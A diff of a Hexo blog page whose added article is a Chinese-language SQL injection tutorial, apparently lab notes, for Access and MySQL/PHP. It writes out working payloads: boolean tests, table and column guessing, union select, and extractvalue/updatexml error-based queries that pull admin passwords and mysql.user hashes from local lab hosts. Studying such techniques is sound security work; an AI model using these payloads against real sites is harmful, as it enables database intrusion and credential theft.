@@ -1,284 +1,1591 @@
-<!DOCTYPE html>
-<html lang=en>
-<head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="123123123123">
-<meta property="og:type" content="article">
-<meta property="og:title" content="文章标题">
-<meta property="og:url" content="http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="123123123123">
-<meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-08-29T04:01:31.000Z">
-<meta property="article:modified_time" content="2021-08-29T04:08:17.084Z">
-<meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>文章标题</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+<!DOCTYPE HTML>
+<html lang="en">
 
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="文章标题, Hexo">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>文章标题 | Hexo</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
 <meta name="generator" content="Hexo 5.4.0"></head>
 
-<body class="max-width mx-auto px3 ltr">
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
     
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/archives/">Writing</a></li>
-         
-          <li><a href="/projects_url">Projects</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        
-        <li><a class="icon" aria-label="Next post " href="/2021/08/29/hello-world/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/&text=文章标题"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/&title=文章标题"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/&is_video=false&description=文章标题"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=文章标题&body=Check out this article: http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/&title=文章标题"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/&title=文章标题"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/&title=文章标题"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/&title=文章标题"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/&name=文章标题&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/08/29/%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/&t=文章标题"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>Contact</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
 </ul>
 
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
     </div>
-    <div id="toc">
-      
-    </div>
-  </span>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
 </div>
 
-    
-    <div class="content index py4">
+
+        </div>
+
         
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        文章标题
-    </h1>
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
 
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
 
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
 
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">John Doe</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2021-08-29T04:01:31.000Z" itemprop="datePublished">2021-08-29</time>
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
         
-      
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">文章标题</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2021-08-29
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="一、access注入"><a href="#一、access注入" class="headerlink" title="一、access注入"></a>一、access注入</h2><h2 id="1、什么是access数据库？"><a href="#1、什么是access数据库？" class="headerlink" title="1、什么是access数据库？"></a>1、什么是access数据库？</h2><ul>
+<li><p>access数据库与其他数据库不一样，他没有存储表的库，所以只能猜表。</p>
+<h2 id="2、access数据库是怎样的一个结构！"><a href="#2、access数据库是怎样的一个结构！" class="headerlink" title="2、access数据库是怎样的一个结构！"></a>2、access数据库是怎样的一个结构！</h2></li>
+<li><p>表</p>
+</li>
+<li><p>字段</p>
+</li>
+<li><p>数据</p>
+<h2 id="3、判断是否存在注入"><a href="#3、判断是否存在注入" class="headerlink" title="3、判断是否存在注入"></a>3、判断是否存在注入</h2></li>
+<li><p>and方法判断</p>
+<pre><code>    [http://127.0.0.1:99/ProductShow.asp?ID=104](http://127.0.0.1:99/ProductShow.asp?ID=104) and 1=1 正确页面
+    [http://127.0.0.1:99/ProductShow.asp?ID=104](http://127.0.0.1:99/ProductShow.asp?ID=104) and 1=2 错误页面 or 判断
+</code></pre>
+</li>
+<li><p>or 方法判断</p>
+<pre><code>    [http://127.0.0.1:99/ProductShow.asp?ID=-104](http://127.0.0.1:99/ProductShow.asp?ID=-104) or 1=2 错误页面
+    [http://127.0.0.1:99/ProductShow.asp?ID=104](http://127.0.0.1:99/ProductShow.asp?ID=104) or 1=1 正常页面
+</code></pre>
+<h2 id="4、如何猜表！"><a href="#4、如何猜表！" class="headerlink" title="4、如何猜表！"></a>4、如何猜表！</h2></li>
+<li><p>页面返回正常 说明 表存在</p>
+<pre><code>    [http://127.0.0.1:99/shownews.asp?id=110](http://127.0.0.1:99/shownews.asp?id=110) and exists (select * from admin)
+</code></pre>
+<h2 id="5、如何猜列！"><a href="#5、如何猜列！" class="headerlink" title="5、如何猜列！"></a>5、如何猜列！</h2><pre><code>     [http://127.0.0.1:99/shownews.asp?id=110](http://127.0.0.1:99/shownews.asp?id=110) and exists (select username from admin)
+     [http://127.0.0.1:99/shownews.asp?id=110](http://127.0.0.1:99/shownews.asp?id=110) and exists (select password from admin)
+</code></pre>
+<h2 id="6、如何猜数据长度！"><a href="#6、如何猜数据长度！" class="headerlink" title="6、如何猜数据长度！"></a>6、如何猜数据长度！</h2></li>
+<li><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614247330196-f7a72fd4-80c5-4dc2-a42e-b93332c195a8.png#align=left&display=inline&height=683&margin=%5Bobject%20Object%5D&name=image.png&originHeight=683&originWidth=765&size=54987&status=done&style=none&width=765" alt="image.png">查询字段的长度</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:99/shownews.asp?id=110">http://127.0.0.1:99/shownews.asp?id=110</a> and (select top 1 len(username) from admin)=8<br>等于 8 就是确定数据的长度 也可以使用大于（&gt;）小于（&lt;）个人认为 等于（=）最<br>好确定长度</p>
+</li>
+<li><p>查询数据asccii码</p>
+<pre><code>a).mid()截取位置
+b)asc()ascii码
+</code></pre>
+<h2 id="7、首先按照常用接收方式的不同可以分为哪三种？"><a href="#7、首先按照常用接收方式的不同可以分为哪三种？" class="headerlink" title="7、首先按照常用接收方式的不同可以分为哪三种？"></a>7、首先按照常用接收方式的不同可以分为哪三种？</h2></li>
+<li><p>GET</p>
+</li>
+</ul>
+<p>a)、GET 请求的参数是放在 URL 里的，GET 请求的 URL 传参有长度限制 中文需要 URL 编 码<br>b)、URL 最长的长度 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/cuihongyu3503319/p/5892257.html">https://www.cnblogs.com/cuihongyu3503319/p/5892257.html</a></p>
+<ul>
+<li>POST</li>
+</ul>
+<p> c)、POST 请求参数是放在请求 body 里的，长度没有限制</p>
+<ul>
+<li>COOKIE</li>
+</ul>
+<p>d)、cookie 参数放在请求头信息，提交的时候 服务器会从请求头获取参数。</p>
+<h2 id="8、注入数据类型的区分是什么？"><a href="#8、注入数据类型的区分是什么？" class="headerlink" title="8、注入数据类型的区分是什么？"></a>8、注入数据类型的区分是什么？</h2><ul>
+<li>int整形</li>
+<li>select * from user where id=1</li>
+</ul>
+<ul>
+<li>sting字符型</li>
+<li>select * from user where username=’admin’</li>
+</ul>
+<ul>
+<li><p>like 搜索型</p>
+</li>
+<li><p>select * from news where title like ‘标题’</p>
+</li>
+<li><p>以上除了第一种以外，其余在判断注入或查询语句的时候都要进行闭合，不闭合SQL语句不仅会出错，可能与原意不一样，会造成错误的判断。</p>
+<h2 id="9、注入方法的区分有什么？"><a href="#9、注入方法的区分有什么？" class="headerlink" title="9、注入方法的区分有什么？"></a>9、注入方法的区分有什么？</h2></li>
+<li><p>联合查询注入 union select 联合两个表</p>
+</li>
+<li><p>报错注入   数据库报错信息  进行注入</p>
+</li>
+<li><p>盲注入</p>
+<pre><code>a)  布尔注入
+b)时间型注入
+</code></pre>
+<h2 id="二、mysql-php-注入"><a href="#二、mysql-php-注入" class="headerlink" title="二、mysql+php 注入"></a>二、mysql+php 注入</h2><h2 id="1、mysql的注释符号有哪些？"><a href="#1、mysql的注释符号有哪些？" class="headerlink" title="1、mysql的注释符号有哪些？"></a>1、mysql的注释符号有哪些？</h2></li>
+<li><h1 id=""><a href="#" class="headerlink" title=""></a></h1></li>
+<li><p>–空格</p>
+</li>
+<li><p>/<em>里面的内容都会被注释</em>/</p>
+</li>
+<li><p>以上用于注释后面语句  不再执行</p>
+<h2 id="2、注入怎样查询系统信息函数？"><a href="#2、注入怎样查询系统信息函数？" class="headerlink" title="2、注入怎样查询系统信息函数？"></a>2、注入怎样查询系统信息函数？</h2></li>
+<li><p>version（） mysql版本</p>
+</li>
+<li><p>user（） 数据库用户名</p>
+</li>
+<li><p>database（） 数据库名</p>
+</li>
+<li><p>@@datadir数据库路径</p>
+</li>
+<li><p>@@version_compile_os 操作系统版本</p>
+<h2 id="3、联合查询-union-select！"><a href="#3、联合查询-union-select！" class="headerlink" title="3、联合查询 union select！"></a>3、联合查询 union select！</h2></li>
+<li><p>union select 查询两个表的内容</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://target_sys.com/article.php?id=-1">http://</a><a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=-1">169.254.82.111:81</a><a target="_blank" rel="noopener" href="http://target_sys.com/article.php?id=-1">/article.php?id=-1</a> union select 1,2,3</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://target_sys.com/article.php?id=1">http://</a><a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=-1">169.254.82.111:81</a><a target="_blank" rel="noopener" href="http://target_sys.com/article.php?id=1">/article.php?id=1</a> and 1=2 union select 1,2,3</p>
+</li>
+<li><p>以上两个语句的意思都是相同的 前面获取数据为 null 将会显示后面的数字</p>
+<h2 id="4、怎么查询数据库名？"><a href="#4、怎么查询数据库名？" class="headerlink" title="4、怎么查询数据库名？"></a>4、怎么查询数据库名？</h2></li>
+<li><p>把数字替换成你要查询的函数名database（）当前数据库名</p>
+<h2 id="7、怎么查询表名？"><a href="#7、怎么查询表名？" class="headerlink" title="7、怎么查询表名？"></a>7、怎么查询表名？</h2></li>
+<li><p>mysql 里面有一个库information_schema里面存在很多信息，其中包括所有库名，表名，字段名，因为可以利用这个库来获取当前库的表</p>
+<h2 id="8、怎么查询字段？"><a href="#8、怎么查询字段？" class="headerlink" title="8、怎么查询字段？"></a>8、怎么查询字段？</h2></li>
+<li><p>查询字段也是查询infromation_schema库里的信息</p>
+<h2 id="三、mysql-php报错注入"><a href="#三、mysql-php报错注入" class="headerlink" title="三、mysql+php报错注入"></a>三、mysql+php报错注入</h2><h2 id="1、怎样判断注入？"><a href="#1、怎样判断注入？" class="headerlink" title="1、怎样判断注入？"></a>1、怎样判断注入？</h2></li>
+<li><p>and 1=1</p>
+</li>
+<li><p>and 1=2</p>
+</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614497869358-6bb31930-6ed6-404a-b840-d182b448554c.png#align=left&display=inline&height=297&margin=%5Bobject%20Object%5D&name=image.png&originHeight=297&originWidth=774&size=31716&status=done&style=none&width=774" alt="image.png"></p>
+<h2 id="2、实战报错注入"><a href="#2、实战报错注入" class="headerlink" title="2、实战报错注入"></a>2、实战报错注入</h2><ul>
+<li><p>查看当前用户名</p>
+<p><a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=1">http://</a><a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=-1">169.254.82.111:81</a><a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=1">/mysqlinj.php?id=1</a> and (extractvalue(1,concat(0x7e,(select<br>user()),0x7e)))<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614501735885-1d9288ac-c253-4059-86c1-1dd0ea5839b1.png#align=left&display=inline&height=161&margin=%5Bobject%20Object%5D&name=image.png&originHeight=161&originWidth=1052&size=19516&status=done&style=none&width=1052" alt="image.png"></p>
+</li>
+<li><p>查看root密码</p>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=1">http://</a><a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=-1">169.254.82.111:81</a><a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=1">/mysqlinj.php?id=1</a> and (extractvalue(1,concat(0x7e,(select password<br>from mysql.user),0x7e)))<br><img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614501869826-2e618622-e675-454d-b525-84ec6f009bf8.png#align=left&display=inline&height=166&margin=%5Bobject%20Object%5D&name=image.png&originHeight=166&originWidth=1160&size=21680&status=done&style=none&width=1160" alt="image.png"></p>
+<ul>
+<li>查询库</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=-1">http://</a><a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=-1">169.254.82.111:81</a><a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=-1">/mysqlinj.php?id=-1</a> and(select 1 from(select count(*),concat((select<br>(select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM<br>information_schema.schemata LIMIT 0,1)) from information_schema.tables limit<br>0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)<img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614570119727-273314f2-a3c6-4219-b946-1d20218baef9.png#align=left&display=inline&height=226&margin=%5Bobject%20Object%5D&name=image.png&originHeight=226&originWidth=765&size=19034&status=done&style=none&width=765" alt="image.png"></p>
+<ul>
+<li>查询第二个库如上图将0改为1则可，同理第三个库则将0改为2， 一直往后推也可以得到所有</li>
+</ul>
+<p>库的名。</p>
+<ul>
+<li>updataxml方法查询数据</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=-1">http://169.254.82.111:81/mysqlinj.php?id=-1</a> and updatexml(1,concat(0x7e,(SELECT distinct<br>concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)</p>
+<ul>
+<li>上面这种查询 只能查询 32 位 所以有些部分查询不出来。可以先查询密文 或者先查询长度的</li>
+</ul>
+<p>再进行字符长度的截取。</p>
+<p><a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=-1">http://</a><a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=-1">169.254.82.111:81</a><a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=-1">/mysqlinj.php?id=-1</a> and updatexml(1,concat(0x7e,(SELECT distinct<br>LENGTH(concat(0x23,username,0x3a,password,0x23)) FROM admin limit 0,1),0x7e),1)</p>
+<ul>
+<li>LENGTH 函数 查询的长度为 40</li>
+</ul>
+<ul>
+<li>SUBSTRING()字符串截取函数</li>
+<li>查询1-32位</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://target_sys.com/mysqlinj.php?id=-1">http://target_sys.com/mysqlinj.php?id=-1</a> and updatexml(1,concat(0x7e,(SELECT distinct<br>SUBSTRING(concat(0x23,username,0x3a,password,0x23),1,32) FROM admin limit<br>0,1),0x7e),1)<br>admin:e10adc3949ba59abbe56e057<img src="https://cdn.nlark.com/yuque/0/2021/png/2380179/1614571480270-2f81871c-d2b7-49d4-b5ce-f94ae0a5e443.png#align=left&display=inline&height=178&margin=%5Bobject%20Object%5D&name=image.png&originHeight=178&originWidth=592&size=16526&status=done&style=none&width=592" alt="image.png"></p>
+<ul>
+<li>查询 32-40 f20f883e</li>
+</ul>
